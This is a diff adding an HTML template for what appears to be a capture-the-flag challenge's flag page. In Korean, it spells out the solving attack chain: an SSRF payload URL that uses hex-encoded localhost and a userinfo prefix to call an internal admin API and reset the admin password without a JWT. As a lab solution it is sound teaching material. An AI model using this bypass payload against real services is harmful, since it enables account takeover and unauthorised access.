@@ -1,0 +1,20 @@
+{% extends "base.html" %}
+{% block title %}Flag{% endblock %}
+
+{% block content %}
+<div class="ptitle">🚩 Flag</div>
+<div class="psub">// 수고했습니다</div>
+
+<div class="flag-section fi">
+  <div class="flag-label">FLAG</div>
+  <span class="flag-link">{{ flag }}</span>
+</div>
+
+<div class="alert alert-info" style="max-width:660px;">
+  <strong>공격 체인:</strong><br>
+  ① SSRF 페이로드 →
+  <code>http://guest@0x7f000001:5000/api/admin/change_password?new_password=hacked</code><br>
+  ② 내부 API가 JWT 없이 admin 비밀번호 변경<br>
+  ③ admin / hacked 로 로그인 → /admin → /admin/flag
+</div>
+{% endblock %}
